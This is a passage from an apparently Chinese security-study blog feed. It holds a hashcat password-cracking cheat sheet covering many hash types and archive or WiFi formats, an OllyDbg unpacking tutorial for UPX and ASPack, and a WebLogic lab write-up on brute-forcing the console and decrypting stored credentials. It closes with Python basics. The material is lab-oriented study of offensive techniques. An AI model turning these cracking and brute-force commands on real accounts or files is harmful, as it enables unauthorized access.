94c3dac6b27b48548ce5817cf05d247c –increment –increment-min=6 –increment-max=8 ?1?1?1?1?1?1?1?1</li><li><img src="/hashcat/9.png" alt></li><li></li><li><strong>6-8位数字+大小写字母+特殊符号</strong></li><li>hashcat64.exe -a 3 -1 ?d?u?l?s 07ff38269731a5d483d7fa58eb0f522f –increment –increment-min 6 –increment-max 8 ?1?1?1?1?1?1</li><li>或者：</li><li>hashcat64.exe -a 3 07ff38269731a5d483d7fa58eb0f522f –increment –increment-min 6 –increment-max 8 ?a?a?a?a?a?a</li><li><img src="/hashcat/10.png" alt></li><li></li><li><strong>字典破解</strong></li><li>hashcat64.exe -a 0 07787964a1e74335c923a46348e1e865 pass.txt (-o result.txt) #-a 0是指定字典破解模式，-o是输出结果到文件中</li><li><img src="/hashcat/11.png" alt></li><li></li><li><strong>批量破解</strong></li><li>hashcat64.exe -a 0 hash.txt pass.txt -o result.txt</li><li></li><li><strong>字典组合破解</strong></li><li>hashcat64.exe -a 1 e3274be5c857fb42ab72d786e281b4b8 pass1.txt pass2.txt</li><li><img src="/hashcat/12.png" alt></li><li></li><li><strong>字典+掩码破解</strong></li><li>hashcat64.exe -a 6 9dc9d5ed5031367d42543763423c24ee pass.txt ?l?l?l?l?l</li><li></li><li><strong>Mysql4.1/5的PASSWORD函数</strong></li><li>hashcat64.exe -a 3 -m 300 –force 81F5E21E35407D884A6CD4A731AEBFB6AF209E1B (?d?d?d?d?d?d可有可无)</li><li><img src="/hashcat/13.png" alt></li><li><img src="/hashcat/14.png" alt></li><li></li><li><strong>sha512crypt $6$, SHA512 (Unix)破解</strong></li><li>hashcat64.exe -a 3 -m 1800 –force $6$GlrSybQA$1AHDMq.ga2QZjmUAHv8eFF4yxJR4X8IjbKBLiXXY8tWH407oYgpPs9f0.ZJTN5KkUx7x.fINKBQWgl6ycDFMy1</li><li><strong>使用–username</strong></li><li>hashcat64.exe -a 3 -m 1800 –force testv:$6$Q3ckMJT8ba3IGcRC$cWAeECECSdxwdi3tBDIz9OvxWyDFPjS2Ostt77xJZK8ruTOkj4chwl/AOLIHbkgqw/WA.bIBzFnQJgLlaqlAm/ –username</li><li></li><li><strong>Windows NT-hash，LM-hash破解</strong></li><li>NT-hash:</li><li>hashcat64.exe -a 3 -m 1000 209C6174DA490CAEB422F3FA5A7AE634 ?l?l?l?l?l</li><li>LM-hash:</li><li>hashcat64.exe -a 3 -m 3000 F0D412BD764FFE81AAD3B435B51404EE ?l?l?l?l?l</li><li></li><li><strong>mssql</strong></li><li>hashcat64.exe -a 3 -m 132 –force 0x01008c8006c224f71f6bf0036f78d863c3c4ff53f8c3c48edafb ?l?l?l?l?l?d?d?d</li><li></li><li><strong>wordpress密码hash破解</strong></li><li>hashcat64.exe -a 3 -m 400 –force $P$BYEYcHEj3vDhV1lwGBv6rpxurKOEWY/ ?d?d?d?d?d?d</li><li></li><li><strong>discuz用户密码hash破解</strong>其密码加密方式md5(md5($pass).$salt)</li><li>hashcat64.exe -a 3 -m 2611 –force 14e1b600b1fd579f47433b88e8d85291: ?d?d?d?d?d?d</li><li></li><li><strong>破解RAR压缩密码</strong></li><li>rar2john获取rar文件hash值：rar2john.exe 1.rar</li><li>1.rar:$rar5$16$639e9ce8344c680da12e8bdd4346a6a3$15$a2b056a21a9836d8d48c2844d171b73d$8$04a52d2224ad082e</li><li>hashcat64.exe -a 3 -m 13000 –force $rar5$16$639e9ce8344c680da12e8bdd4346a6a3$15$a2b056a21a9836d8d48c2844d171b73d$8$04a52d2224ad082e ?d?d?d?d?d?d</li><li></li><li><strong>zip密码破解</strong></li><li>zip2john获取文件的hash值：zip2john.exe 1.zip</li><li>结果：1.zip:$zip2$<em>0</em>3<em>0</em>554bb43ff71cb0cac76326f292119dfd<em>ff23<em>5</em>24b28885ee*d4fe362bb1e91319ab53</em>$/zip2$:::::1.zip-1.txt</li><li>hashcat64.exe -a 3 -m 13600 $zip2$<em>0</em>3<em>0</em>554bb43ff71cb0cac76326f292119dfd<em>ff23<em>5</em>24b28885ee*d4fe362bb1e91319ab53</em>$/zip2$ –force ?d?d?d?d?d?d</li><li></li><li><strong>破解office密码</strong></li><li>office的hash值：python office2john.py 11.docx</li><li>结果：11.docx:$office$<em>2013</em>100000<em>256</em>16<em>e4a3eb62e8d3576f861f9eded75e0525</em>9eeb35f0849a7800d48113440b4bbb9c*577f8d8b2e1c5f60fed76e62327b38d28f25230f6c7dfd66588d9ca8097aabb9</li><li>hashcat64.exe -a 3 -m 9600 $office$<em>2013</em>100000<em>256</em>16<em>e4a3eb62e8d3576f861f9eded75e0525</em>9eeb35f0849a7800d48113440b4bbb9c*577f8d8b2e1c5f60fed76e62327b38d28f25230f6c7dfd66588d9ca8097aabb9 –force ?d?d?d?d?d?d</li><li></li><li><strong>破解WIFI密码</strong></li><li>官方在线转化<a href="https://hashcat.net/cap2hccapx/" target="_blank" rel="noopener">https://hashcat.net/cap2hccapx/</a></li><li>hashcat64.exe -a 3 -m 2500 1.hccapx 1391040?d?d?d?d</li></ol><h2 id="0x02-其他"><a href="#0x02-其他" class="headerlink" title="0x02 其他"></a>0x02 其他</h2><ol><li>爆破过的结果会保存在hashcat.profile文件中</li><li>hashcat64.exe 要破解hash值 –show #查看是否破解过，有则显示结果</li><li>破解过程时间长时，按s查看状态，p暂停，r继续破解，q退出</li><li>使用GPU模式进行破解时，使用-O参数自动进行优化</li></ol><h2 id="0x03-hash-ID列表"><a href="#0x03-hash-ID列表" class="headerlink" title="0x03 hash ID列表"></a>0x03 hash ID列表</h2><p><img src="/hashcat/6.png" alt></p><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol><li><a href="https://blog.csdn.net/SHIGUANGTUJING/article/details/90074614" target="_blank" rel="noopener">https://blog.csdn.net/SHIGUANGTUJING/article/details/90074614</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>脱壳一</title>
      <link href="/%E8%84%B1%E5%A3%B3/"/>
      <url>/%E8%84%B1%E5%A3%B3/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-环境"><a href="#0x00-环境" class="headerlink" title="0x00 环境"></a>0x00 环境</h2><ol><li>工具：PEID（查壳）、OllyDbg（调试）、OllyDbg自带的插件（脱壳）、LordPE（脱壳）、ImportREC（修复）</li><li>加壳的程序</li></ol><h2 id="0x10-UPX壳"><a href="#0x10-UPX壳" class="headerlink" title="0x10 UPX壳"></a>0x10 UPX壳</h2><ol><li>UPX：压缩壳</li></ol><h3 id="0x11-单步跟踪法"><a href="#0x11-单步跟踪法" class="headerlink" title="0x11 单步跟踪法"></a>0x11 单步跟踪法</h3><ol start="5"><li>查壳</li><li><img src="/%E8%84%B1%E5%A3%B3/1.png" alt></li><li>OD载入</li><li><img src="/%E8%84%B1%E5%A3%B3/2.png" alt></li><li>单步步过（快捷键F8）</li><li><img src="/%E8%84%B1%E5%A3%B3/3.png" alt></li><li>红线代表已经实现，绿线代表没实现，向下的红线让它跳转（继续F8），向上的红线禁止它跳转（点击下一行，右击——断点——运行到选定的位置F4）（也可以选定下一行，右击——断点——切换（快捷键F2），点击运行（F9），再右击——断点——切换（快捷键F2），即点击下一行，按F2-F9-F2）</li><li><img src="/%E8%84%B1%E5%A3%B3/4.png" alt></li><li><img src="/%E8%84%B1%E5%A3%B3/5.png" alt></li><li>碰到下一行也是跳转，就点击下下一行</li><li><img src="/%E8%84%B1%E5%A3%B3/6.png" alt></li><li>碰到一个jmp跳转，但是下一个是call，所以到下下一行</li><li><img src="/%E8%84%B1%E5%A3%B3/7.png" alt></li><li>关键命令：popad，出栈命令，下一行是个jmp，跳转的跨度很大</li><li><img src="/%E8%84%B1%E5%A3%B3/8.png" alt></li><li><img src="/%E8%84%B1%E5%A3%B3/9.png" alt></li><li>这就是程序入口点（OEP）</li><li>使用OllyDbg自带的插件来脱壳，两种方式</li><li><img src="/%E8%84%B1%E5%A3%B3/10.png" alt></li><li><img src="/%E8%84%B1%E5%A3%B3/11.png" alt></li><li>使用两种方式脱壳，点击脱壳，随意命名为1.exe和2.exe</li><li>使用LordPE来脱壳，打开LordPE，找到目的程序，右击——修正镜像大小——右击——完全转存——随意命名为3.exe</li><li><img src="/%E8%84%B1%E5%A3%B3/12.png" alt></li><li><img src="/%E8%84%B1%E5%A3%B3/13.png" alt></li><li>查看已脱壳的3个程序</li><li><img src="/%E8%84%B1%E5%A3%B3/14.png" alt></li><li>查壳</li><li><img src="/%E8%84%B1%E5%A3%B3/15.png" alt></li><li><img src="/%E8%84%B1%E5%A3%B3/16.png" alt></li><li><img src="/%E8%84%B1%E5%A3%B3/17.png" alt></li><li>1.exe和2.exe都能正常运行</li><li><img src="/%E8%84%B1%E5%A3%B3/18.png" alt></li><li>3.exe不能正常运行</li><li><img src="/%E8%84%B1%E5%A3%B3/19.png" alt></li><li>使用ImportREC修复转存文件——运行——找到目的程序——修改OEP为OD里OEP地址减去基址00400000，即7738C——自动查找IAT——获取输入表——无效函数（这里无）——转储到文件——选3.exe——就多了新程序3_.exe</li><li><img src="/%E8%84%B1%E5%A3%B3/20.png" alt></li><li><img src="/%E8%84%B1%E5%A3%B3/21.png" alt></li><li><img src="/%E8%84%B1%E5%A3%B3/22.png" alt></li><li>再来查壳</li><li><img src="/%E8%84%B1%E5%A3%B3/23.png" alt></li><li><img src="/%E8%84%B1%E5%A3%B3/24.png" alt></li><li>运行正常</li><li><img src="/%E8%84%B1%E5%A3%B3/25.png" alt></li></ol><h3 id="0x12-ESP定律法"><a href="#0x12-ESP定律法" class="headerlink" title="0x12 ESP定律法"></a>0x12 ESP定律法</h3><ol><li>pushad，入栈命令，关注寄存器位置</li><li><img src="/%E8%84%B1%E5%A3%B3/26.png" alt></li><li>单步步过F8（一般是关键命令的下一个命令），ESP突变</li><li><img src="/%E8%84%B1%E5%A3%B3/27.png" alt></li><li>点击ESP数值，右击——数据窗口中跟随——来到数据窗口——选地址为ESP数值的地址——断点——设置硬件访问断点（word或dword）——运行F9——来到了jmp，注意前面的命令：popad，出栈——再F8就来到OEP</li><li><img src="/%E8%84%B1%E5%A3%B3/28.png" alt></li><li><img src="/%E8%84%B1%E5%A3%B3/29.png" alt></li><li><img src="/%E8%84%B1%E5%A3%B3/30.png" alt></li><li><img src="/%E8%84%B1%E5%A3%B3/31.png" alt></li><li><img src="/%E8%84%B1%E5%A3%B3/32.png" alt></li><li>或者在命令输入dd 0012FFA4（ESP数值）</li><li><img src="/%E8%84%B1%E5%A3%B3/33.png" alt></li><li>数据窗口就跳转到ESP数值，然后同上</li><li>然后脱壳。</li></ol><h3 id="0x13-2次内存镜像法"><a href="#0x13-2次内存镜像法" class="headerlink" title="0x13 2次内存镜像法"></a>0x13 2次内存镜像法</h3><ol><li>重新运行程序ctrl+F2</li><li><img src="/%E8%84%B1%E5%A3%B3/34.png" alt></li><li>查看——内存（alt+m），或者点击m，进入内存映射</li><li><img src="/%E8%84%B1%E5%A3%B3/35.png" alt></li><li>找到目的程序的.rsrc——右击——在访问上设置中断F2——运行F9——再alt+m进入内存映射——点击UPX0——下断点F2——运行F9——来到不知什么位置——单步步过（其实很快到popad）</li><li><img src="/%E8%84%B1%E5%A3%B3/36.png" alt></li><li><img src="/%E8%84%B1%E5%A3%B3/37.png" alt></li><li><img src="/%E8%84%B1%E5%A3%B3/38.png" alt></li></ol><h3 id="0x14-一步直达法"><a href="#0x14-一步直达法" class="headerlink" title="0x14 一步直达法"></a>0x14 一步直达法</h3><ol><li>aspack壳或upx壳部分能用</li><li>反汇编窗口——右击——查找——命令（ctrl+F）</li><li><img src="/%E8%84%B1%E5%A3%B3/39.png" alt></li><li>输入popad，不勾选整个块</li><li><img src="/%E8%84%B1%E5%A3%B3/40.png" alt></li><li>这个程序就直接到popad</li><li>下面就是jmp到OEP</li><li><img src="/%E8%84%B1%E5%A3%B3/41.png" alt></li></ol><h2 id="0x20-ASPACK壳"><a href="#0x20-ASPACK壳" class="headerlink" title="0x20 ASPACK壳"></a>0x20 ASPACK壳</h2><ol><li>ASPACK：压缩壳</li></ol><h3 id="0x21-单步跟踪法"><a href="#0x21-单步跟踪法" class="headerlink" title="0x21 单步跟踪法"></a>0x21 单步跟踪法</h3><ol><li>查壳</li><li><img src="/%E8%84%B1%E5%A3%B3/42.png" alt></li><li>OD载入</li><li>单步步过F8，遇到call，再F8程序就自动运行了</li><li><img src="/%E8%84%B1%E5%A3%B3/43.png" alt></li><li>再来，到call时，单步步入F7，进入</li><li><img src="/%E8%84%B1%E5%A3%B3/44.png" alt></li><li>单步步过F8，又遇到call，再重来，单步步入F7</li><li><img src="/%E8%84%B1%E5%A3%B3/45.png" alt></li><li><img src="/%E8%84%B1%E5%A3%B3/46.png" alt></li><li>单步步过F8，单步跟踪法</li><li>跳过向上跳转，右击——断点——运行到指定位置F4，…，直到popad</li><li><img src="/%E8%84%B1%E5%A3%B3/47.png" alt></li><li>这里有个retn，返回，继续F8</li><li><img src="/%E8%84%B1%E5%A3%B3/48.png" alt></li><li><img src="/%E8%84%B1%E5%A3%B3/49.png" alt></li><li>这就是OEP</li></ol><h3 id="0x22-ESP定律法"><a href="#0x22-ESP定律法" class="headerlink" title="0x22 ESP定律法"></a>0x22 ESP定律法</h3><ol><li>OD载入，关注寄存器</li><li><img src="/%E8%84%B1%E5%A3%B3/50.png" alt></li><li>F8，关注寄存器，只有ESP是红色</li><li><img src="/%E8%84%B1%E5%A3%B3/51.png" alt></li><li>右击ESP的数值，数据窗口中跟随</li><li><img src="/%E8%84%B1%E5%A3%B3/52.png" alt></li><li>数据窗口的第一位地址就是ESP那个数值，右击数据窗口地址——断点——硬件访问——word或Dword</li><li><img src="/%E8%84%B1%E5%A3%B3/53.png" alt></li><li>运行F9，来到当前位置，其实popad就在上面</li><li><img src="/%E8%84%B1%E5%A3%B3/54.png" alt></li><li>F8，直到跳到OEP</li></ol><h3 id="0x23-一步直达法"><a href="#0x23-一步直达法" class="headerlink" title="0x23 一步直达法"></a>0x23 一步直达法</h3><ol><li>OD载入，右击反汇编窗口——查找——命令（快捷键ctrl+f）</li><li><img src="/%E8%84%B1%E5%A3%B3/55.png" alt></li><li>搜索popad，不勾选整个块</li><li><img src="/%E8%84%B1%E5%A3%B3/56.png" alt></li><li>一个个查找，不是就查找下一个（快捷键ctrl+l），直到查找到目的popad</li><li><img src="/%E8%84%B1%E5%A3%B3/57.png" alt></li><li>右击——断点——运行到指定位置F4，F8，直到跳到OEP</li></ol><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol><li>ximo早期发的脱壳基础</li><li><a href="https://www.52pojie.cn/" target="_blank" rel="noopener">https://www.52pojie.cn/</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic序列漏洞</title>
      <link href="/Weblogic%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/"/>
      <url>/Weblogic%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前排"><a href="#0x00-前排" class="headerlink" title="0x00 前排"></a>0x00 前排</h2><ol><li>WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</li></ol><h2 id="0x10-常见版本"><a href="#0x10-常见版本" class="headerlink" title="0x10 常见版本"></a>0x10 常见版本</h2><ol><li>Weblogic 10.3.6.0</li><li>Weblogic 12.1.3.0</li><li>Weblogic 12.2.1.1</li><li>Weblogic 12.2.1.2</li><li>Weblogic 12.2.1.3</li></ol><h2 id="0x20-历史漏洞"><a href="#0x20-历史漏洞" class="headerlink" title="0x20 历史漏洞"></a>0x20 历史漏洞</h2><ol><li><strong>控制台路径泄露</strong></li><li>Console</li><li></li><li><strong>SSRF</strong></li><li>CVE-2014-4210</li><li></li><li><strong>JAVA反序列化</strong></li><li>CVE-2015-4852  </li><li>CVE-2016-0638  </li><li>CVE-2016-3510   </li><li>CVE-2017-3248   </li><li>CVE-2018-2628 </li><li>CVE-2018-2893</li><li>CVE-2019-2725</li><li>CVE-2019-2729</li><li></li><li><strong>任意文件上传</strong></li><li>CVE-2018-2894</li><li></li><li><strong>XMLDecoder反序列化</strong> </li><li>CVE-2017-3506</li><li>CVE-2017-10271</li></ol><h2 id="0x30-控制台路径泄露"><a href="#0x30-控制台路径泄露" class="headerlink" title="0x30 控制台路径泄露"></a>0x30 控制台路径泄露</h2><ol><li>这控制台路径泄露本来不算漏洞，算漏洞也是个低危，但是，说到底这是登录控制台的，若存在弱口令、被猜出账号密码或被爆破出账号密码就不是低危了。</li><li>环境：</li><li>weblogic 10.3.6(11g)</li><li>linux and docker</li><li>docker-compose up -d #docker搭建环境</li><li><img src="/Weblogic%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/1.png" alt></li><li>docker ps #查看正在运行的容器、IP、端口</li><li>访问 <a href="http://192.168.100.4:7001/console/login/LoginForm.jsp" target="_blank" rel="noopener">http://192.168.100.4:7001/console/login/LoginForm.jsp</a></li><li><img src="/Weblogic%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/2.png" alt></li><li>抓取登录数据包</li><li><img src="/Weblogic%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/3.png" alt></li><li><a href="https://cirt.net/passwords?criteria=weblogic" target="_blank" rel="noopener">weblogic常见弱口令</a></li><li>Python脚本简单爆破账号密码，结果没成功~</li><li><img src="/Weblogic%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/4.png" alt></li><li>这里模拟存在弱口令的，进容器看看</li><li>docker ps</li><li>docker exec -it ID /bin/bash #进入容器</li><li><img src="/Weblogic%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/5.png" alt></li><li>找账号密码之路，在~/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/security# cat boot.properties</li><li><img src="/Weblogic%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/6.png" alt></li><li>username={AES}xdwPe62ds+jcPCQwwLn/VR3fI0e9ZGkFz96ZBqmvRpY=</li><li>password={AES}dv/eNBsyg5GcDUbAKaQRheDZhzVk9yiTYVpXlGt9wEU=</li><li>解密，用环境中自带的weblogic_decrypt.jar解密，加密key是~/Oracle/Middleware/user_projects/domains/base_domain/security/SerializedSystemIni.dat</li><li>把SerializedSystemIni.dat从docker中复制到主机（kali，其实也是虚拟机，233）</li><li>docker cp 容器NAME:文件名路径 kali主机的路径  #从docker复制到主机</li><li>docker cp kali主机路径/文件 容器NAME:文件名路径 #从主机复制到docker</li><li><img src="/Weblogic%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/7.png" alt></li><li>启动解密工具：java -jar weblogic_decrypt.jar </li><li><img src="/Weblogic%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/8.png" alt></li><li>不知为啥，等了很久，就是不显示解密密码，放弃</li><li>其他的解密方式<a href="https://www.freebuf.com/articles/web/220147.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/220147.html</a></li><li>访问 http:/127.0.0.1:7001/console/login/LoginForm.jsp 登录weblogic/Oracle@123，登录成功的</li><li>修改访问IP配置</li><li><img src="/Weblogic%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/9.png" alt></li><li>exit #退出容器</li><li>docker restart ID/NAME #重启容器</li><li>再Python脚本简单爆破账号密码，成功了（这里环境默认设置登录次数达到限制次数，就锁定帐号一段时间）</li><li><img src="/Weblogic%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/10.png" alt></li><li>后台上传webshell-部署-安装-上传文件—getshell（忽略）</li></ol><h2 id="0x40-weblogic-SSRF"><a href="#0x40-weblogic-SSRF" class="headerlink" title="0x40 weblogic SSRF"></a>0x40 weblogic SSRF</h2><ol><li>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</li><li>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</li><li></li><li>docker-compose build 或 docker-compose up -d #拉取环境</li><li>关键目录/uddiexplorer/，无需登录就可访问，<a href="http://IP:7001/uddiexplorer/" target="_blank" rel="noopener">http://IP:7001/uddiexplorer/</a></li></ol><h2 id="0x"><a href="#0x" class="headerlink" title="0x"></a>0x</h2><h2 id="0x-1"><a href="#0x-1" class="headerlink" title="0x"></a>0x</h2><h2 id="0x-2"><a href="#0x-2" class="headerlink" title="0x"></a>0x</h2><h2 id="0xFF-参考链接、环境、验证工具"><a href="#0xFF-参考链接、环境、验证工具" class="headerlink" title="0xFF 参考链接、环境、验证工具"></a>0xFF 参考链接、环境、验证工具</h2><p><a href="https://github.com/rabbitmask/WeblogicScan" target="_blank" rel="noopener">https://github.com/rabbitmask/WeblogicScan</a><br><a href="https://vulhub.org/#/environments/" target="_blank" rel="noopener">https://vulhub.org/#/environments/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> CVE </tag>
            
            <tag> weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python3基础</title>
      <link href="/Python%E5%9F%BA%E7%A1%80/"/>
      <url>/Python%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-基础语法"><a href="#0x00-基础语法" class="headerlink" title="0x00 基础语法"></a>0x00 基础语法</h2><p><strong>python文件编码</strong></p><ol><li>#coding:utf-8</li><li>#-*- coding:utf-8 -*- </li></ol><p><strong>标识符</strong></p><ol><li>第一个字符必须为字母或下划线_</li><li>其他的可以是字母、数字、下划线</li><li>大小写敏感</li></ol><p><strong>关键字</strong></p><ol><li>&gt;&gt;&gt;import keyword</li><li>&gt;&gt;&gt;keyword.kwlist</li><li><img src="/Python%E5%9F%BA%E7%A1%80/1.png" alt></li></ol><p><strong>注释</strong></p><ol><li>#   #单行注释</li><li>``` #多行注释</li><li>``` </li></ol><p><strong>多行语句</strong></p><ol><li>sum=a+\ </li><li>b+\</li><li>c      #sum=a+b+c</li></ol><p><strong>字符串</strong></p><ol><li>str=’字符串’</li><li>str=”字符串”</li><li>str=’’’字，</li><li>符，</li><li>串’’’</li><li>str=”””字符，</li><li>串”””</li><li><strong>字符串串联</strong></li><li><img src="/Python%E5%9F%BA%E7%A1%80/3.png" alt></li><li><strong>字符串截取</strong></li><li>str=’qwertyuiop’</li><li>print(str[首位:尾位:间隔])</li><li><img src="/Python%E5%9F%BA%E7%A1%80/4.png" alt></li><li><img src="/Python%E5%9F%BA%E7%A1%80/6.png" alt></li></ol><p><strong>转义符</strong></p><ol><li>‘\‘  #\n</li><li><img src="/Python%E5%9F%BA%E7%A1%80/2.png" alt></li></ol><p><strong>等待用户输入</strong></p><ol><li>str=input(“输入：”)</li></ol><p><strong>一行显示多行</strong></p><ol><li><img src="/Python%E5%9F%BA%E7%A1%80/5.png" alt></li></ol><p><strong>不换行输出</strong></p><ol><li>print(‘a’,end=” “)</li><li>print(‘b’,end=” “)</li></ol><p><strong>帮助信息</strong></p><ol><li>python -h</li><li>python -c “import os;os.system(‘whoami’)”</li></ol><p><strong>列表、元组、集合、字典</strong></p><ol><li>列表list的元素写在方括号[]里；元组tuple的元素不能修改，写在小括号()里；集合set，在大括号{}或set()里；字典dictionary，用大括号{}标识，{‘key’:’value’}</li><li>a=[1,2,3,4,5]</li><li><img src="/Python%E5%9F%BA%E7%A1%80/7.png" alt></li><li><img src="/Python%E5%9F%BA%E7%A1%80/8.png" alt></li><li><img src="/Python%E5%9F%BA%E7%A1%80/25.png" alt></li><li><img src="/Python%E5%9F%BA%E7%A1%80/26.png" alt></li><li><img src="/Python%E5%9F%BA%E7%A1%80/27.png" alt></li></ol><p><strong>数据类型转换</strong></p><ol><li><img src="/Python%E5%9F%BA%E7%A1%80/9.png" alt></li></ol><p><strong>Python解析器</strong></p><ol><li>#!/usr/bin/env python3</li></ol><p><strong>运算符</strong></p><ol><li><p>Python算术运算符</p></li><li><p><img src="/Python%E5%9F%BA%E7%A1%80/10.png" alt></p></li><li><p>Python比较运算符</p></li><li><p><img src="/Python%E5%9F%BA%E7%A1%80/11.png" alt></p></li><li><p>Python赋值运算符</p></li><li><p><img src="/Python%E5%9F%BA%E7%A1%80/12.png" alt></p></li><li><p>Python位运算符</p></li><li><p><img src="/Python%E5%9F%BA%E7%A1%80/13.png" alt></p></li><li><p>Python逻辑运算符</p></li><li><p><img src="/Python%E5%9F%BA%E7%A1%80/14.png" alt></p></li><li><p>Python运算符优先级</p></li><li><p><img src="/Python%E5%9F%BA%E7%A1%80/15.png" alt></p></li><li><p>数学函数</p></li><li><p><img src="/Python%E5%9F%BA%E7%A1%80/16.png" alt></p></li><li><p>随机数函数</p></li><li><p><img src="/Python%E5%9F%BA%E7%A1%80/17.png" alt></p></li><li><p>三角函数</p></li><li><p><img src="/Python%E5%9F%BA%E7%A1%80/18.png" alt></p></li><li><p>数学常量</p></li><li><p><img src="/Python%E5%9F%BA%E7%A1%80/19.png" alt></p></li><li><p>Python转义字符</p></li><li><p><img src="/Python%E5%9F%BA%E7%A1%80/20.png" alt></p></li><li><p>Python字符串运算符</p></li><li><p><img src="/Python%E5%9F%BA%E7%A1%80/21.png" alt></p></li><li><p>python字符串格式化符号</p></li><li><p><img src="/Python%E5%9F%BA%E7%A1%80/22.png" alt></p></li><li><p>格式化操作符辅助指令</p></li><li><p><img src="/Python%E5%9F%BA%E7%A1%80/23.png" alt></p></li><li><p>Python 的字符串内建函数</p></li><li><p><img src="/Python%E5%9F%BA%E7%A1%80/24.png" alt></p></li></ol><h2 id="0x10-简单编程"><a href="#0x10-简单编程" class="headerlink" title="0x10 简单编程"></a>0x10 简单编程</h2><ol><li><strong>end关键字</strong></li><li><img src="/Python%E5%9F%BA%E7%A1%80/28.png" alt></li><li></li><li><strong>if嵌套</strong></li><li>if 表达式1:</li><li>语句</li><li>if 表达式2:</li><li>语句</li><li>elif 表达式3:</li><li>语句</li><li>else:</li><li>语句</li><li>elif 表达式4:</li><li>语句</li><li>else:</li><li>语句</li><li></li><li><strong>while循环</strong></li><li><strong>while 循环使用 else 语句</strong></li><li><strong>for语句</strong></li><li><strong>range()函数</strong></li><li>for i in range(5):</li><li>print(i) #0 1 2 3 4 5</li><li>for i in range(1,5):</li><li>print(i) #1 2 3 4</li><li></li><li><strong>break</strong></li><li><img src="/Python%E5%9F%BA%E7%A1%80/29.png" alt></li><li><strong>continue</strong></li><li><img src="/Python%E5%9F%BA%E7%A1%80/30.png" alt></li><li>pass</li></ol><p><strong>迭代器与生成器</strong></p><ol><li>iter() #创建迭代器对象</li><li><img src="/Python%E5%9F%BA%E7%A1%80/31.png" alt></li><li><img src="/Python%E5%9F%BA%E7%A1%80/32.png" alt></li></ol><h2 id="0x11-函数-and-手册内置函数-and-python3内置函数"><a href="#0x11-函数-and-手册内置函数-and-python3内置函数" class="headerlink" title="0x11 函数 and 手册内置函数 and python3内置函数"></a>0x11 函数 and <a href="https://docs.python.org/zh-cn/3/library/functions.html" target="_blank" rel="noopener">手册内置函数</a> and <a href="https://www.runoob.com/python3/python3-built-in-functions.html" target="_blank" rel="noopener">python3内置函数</a></h2><ol><li><img src="/Python%E5%9F%BA%E7%A1%80/33.png" alt></li><li><img src="/Python%E5%9F%BA%E7%A1%80/37.png" alt></li><li>abs(num) #返回num的绝对值</li><li>all() #所有元素为真则返回True</li><li>any() #任一元素为真则返回True</li><li>ascii()</li><li>bin() #其他进制转2进制</li><li>format() #格式化函数，format(23,’b’) 可返回二进制数</li><li>chr() #整型转ascii型</li><li>dir() #无实参，则返回本地作用域中的名称列表；有实参，则返回该对象的有效属性列表</li><li>divmod(a,b) #返回商和余数，即(a//b,a%b)</li><li>eval(表达式) #可解析表达式并求值，eval(‘1+2’)</li><li>exec() #支持动态执行Python代码</li><li>float() #返回浮点数</li><li>getattr() #获取对象的属性的值</li><li>globals() #返回当前全局符号表的字典</li><li>hash() #返回哈希值</li><li>help() #启动内置的帮助系统</li><li>hex() #其他进制转16进制</li><li>id() #返回对象的标识值</li><li>int() #字符串或数字转换为整型</li><li>input() #从输入中的读取一行</li><li>isinstance() #判断是否整型</li><li>iter() #生成迭代器</li><li>len() #返回对象的个数</li><li>list() #列表</li><li>locals() #字典类型返回当前位置的全部局部变量</li><li>map() #函数映射</li><li>max() #返回最大值</li><li>min() #返回最小值</li><li>next() #返回迭代器的下一个项目</li><li>oct() #其他进制转8进制</li><li>open() #打开某个文件，close() #关闭文件对象</li><li>ord() #字符转ascii码值</li><li>pow() #次方</li><li>print() #输出，默认以换行符\n结尾</li><li>range() #返回可迭代的对象</li><li>repr() #将对象转换为供解释器读取的形式</li><li>reversed() #返回一个反转的迭代器</li><li>round() #返回浮点数的四舍五入值</li><li>set() #创建无序、不重复元素集，删除重复数据</li><li>setattr() #设置属性值</li><li>sorted() #对所有可迭代的对象进行排序操作，默认升序</li><li>str() #将对象转换为字符型</li><li>sum() #求和</li><li>super() #用于调用父类的一个方法</li><li>tuple() #将可迭代对象序列为元组</li><li>type() #返回对象的类型</li><li>zip() 